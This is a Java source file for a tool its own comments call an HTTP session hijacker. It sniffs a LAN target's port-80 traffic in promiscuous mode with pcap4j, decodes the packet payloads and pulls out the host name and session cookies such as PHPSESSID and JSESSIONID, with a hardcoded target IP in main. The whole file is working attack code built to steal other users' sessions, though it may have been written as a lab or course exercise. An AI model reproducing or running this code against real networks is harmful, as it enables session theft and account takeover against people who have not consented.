import org.pcap4j.core.*;

import java.io.*;
import java.net.InetAddress;
import java.util.concurrent.TimeoutException;

/**
 * @author Emu
 * This class provides the HTTP hijacking background procedures.
 * It can be called through the Hijacker function to listen in on a target's HTTP port and snatch any detected session id cookies.
 */
public class HTTPHijack {

    /**
     * Creates a file with the given name.
     * @param name The name of the file that should be created.
     */
    private static void OpenFile(String name) {
        try {
            File myObj = new File(name);
            if (myObj.createNewFile()) {
                System.err.println("File created: " + myObj.getName());
            } else {
                System.err.println("File already exists.");
            }
        } catch (IOException e) {
            System.out.println("An error occurred.");
            e.printStackTrace();
        }

    }

    /**
     * Establishes a packet handler that listens to the target's tcp port 80 (HTTP port) with a certain timeout.
     * When a packet is detected, it is written to PacketsOutput.txt .
     * The method notifies when the timeout is reached with a message to stderr.
     * @param target The target's IP.
     * @param time The timeout(in seconds).
     */
    private static void WritePackets(String target, int time){
        InetAddress addr = null;
        try {
            addr = InetAddress.getByName(target);
        } catch (java.net.UnknownHostException e) {
            e.printStackTrace();
        }
        PcapNetworkInterface nif = null;
        try {
            nif = Pcaps.getDevByAddress(addr);
        } catch (PcapNativeException | NullPointerException e) {
            e.printStackTrace();
        }

        int snapLen = 65536;
        PcapNetworkInterface.PromiscuousMode mode = PcapNetworkInterface.PromiscuousMode.PROMISCUOUS;
        int timeout = time*1000;
        String filter = "tcp port 80";
        PcapHandle handle = null;
        FileWriter packetWriter = null;
        try {
            packetWriter = new FileWriter("PacketsOutput.txt");
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            assert nif != null;
            handle = nif.openLive(snapLen, mode, timeout);
            handle.setFilter(filter, BpfProgram.BpfCompileMode.OPTIMIZE);
            System.out.println(handle.toString());
        } catch (PcapNativeException | NotOpenException | NullPointerException e) {
            e.printStackTrace();
        }
        try {
            for(int i = 0; i < 64 ; i++) {
                packetWriter.write(String.valueOf(handle.getNextPacketEx()));
            }
        } catch (PcapNativeException | NotOpenException | NullPointerException | IOException e) {
            e.printStackTrace();
        } catch (TimeoutException e){
            System.err.println("No cookies found yet!");
        }
        handle.close();
        try {
            packetWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Goes through all the text in PacketsOutput.txt line by line and considers only the data hex strings in the packets (if the strings exist).
     * The considered data is converted to plaintext (hexadecimal to ASCII) and is written to to DataOutput.txt .
     */
    private static void StripPackets(){
        BufferedReader reader;
        FileWriter dataWriter;
        try {
            dataWriter = new FileWriter("DataOutput.txt");
            reader = new BufferedReader(new FileReader("PacketsOutput.txt"));
            String line = reader.readLine();
            while (line != null) {
                if(!line.isEmpty()) {//offset 2
                    if(line.startsWith("Hex", 2)){
                        StringBuilder builder = new StringBuilder();
                        String hex = line.substring(14);
                        for (int i = 0; i < hex.length(); i = i + 3) {
                            String s = hex.substring(i, i + 2);
                            int n = Integer.valueOf(s, 16);
                            builder.append((char)n);
                        }
                        dataWriter.write(builder.toString());
                    }

                }
                line = reader.readLine();
            }
            reader.close();
            dataWriter.close();

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * This reads the plaintext data in DataOutput.txt line by line and looks for hostnames and cookies.
     * Hostnames are saved when found, and discarded as well as any cookies that are not session id cookies.
     * If a session id cookie is found, it, as well as the host are returned.
     * @return An array of 2 strings. The first string contains the host name, and the second the session ID cookie and it's value. Null if no session cookies have been found.
     */
    private static String[] StripData(){
        String[] output = new String[2];
        BufferedReader reader;
        try {
            reader = new BufferedReader(new FileReader("DataOutput.txt"));
            String line = reader.readLine();
            while (line != null) {
                if(line.startsWith("Host:")){
                    String host = line.substring(6);
                    output[0] = host;
                    //System.out.println(host);
                }
                if(line.startsWith("Cookie:")){
                    boolean containsSession = false;
                    String cookie = line.substring(8);//JSESSIONID (Java EE), PHPSESSID (PHP), and ASPSESSIONID (Microsoft ASP).
                    if(cookie.contains("PHPSESSID")){
                        cookie = cookie.substring(cookie.indexOf("PHPSESSID"));
                        containsSession = true;
                    } else if(cookie.contains("JSESSIONID")){
                        cookie = cookie.substring(cookie.indexOf("JSESSIONID"));
                        containsSession = true;
                    } else if(cookie.contains("PASPSESSIONID")){
                        cookie = cookie.substring(cookie.indexOf("ASPSESSIONID"));
                        containsSession = true;
                    }
                    if(cookie.contains(" ")){
                        cookie = cookie.substring(0, cookie.indexOf(" "));
                    }
                    if(containsSession) {
                        output[1] = cookie;
                        return output;
                    }
                }
                line = reader.readLine();
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * Assembles the whole process together. The packets are captured and noted onto PacketsOutput.txt, then stripped of
     * any non-data components, after which the data is translated to plaintext and cookies are searched for.
     * The process is iterated multiple times with smaller timeouts so that the packet handler is less likely to get stuck
     * in a perpetual timeout refresh loop.
     * @param target The target's IP. SHould be on the same LAN.
     * @param timeout The timeout for listening on the target (in seconds).
     * @return An array of 2 strings. The first string contains the host name,and the second the session ID cookie and it's value. Null if no session cookies have been found.
     */
    public static String[] Hijacker(String target, int timeout){
        OpenFile("DataOutput.txt");
        OpenFile("PacketsOutput.txt");
        for(int i = 0; i < timeout/5; i++) {
            WritePackets(target, 5);
            StripPackets();
            String[] ans = StripData();
            if(ans != null) {
                return ans;
            }
        }
        return null;
    }

    public static void main(String[] args) {
        String target = "10.10.1.32";
        int time = 40;//in seconds
        String[] ans = Hijacker(target, time);
        try {
            System.out.println(ans[0]);
            System.out.println(ans[1]);
        } catch (NullPointerException e){
            System.out.println("No cookie found!");
        }
    }
}
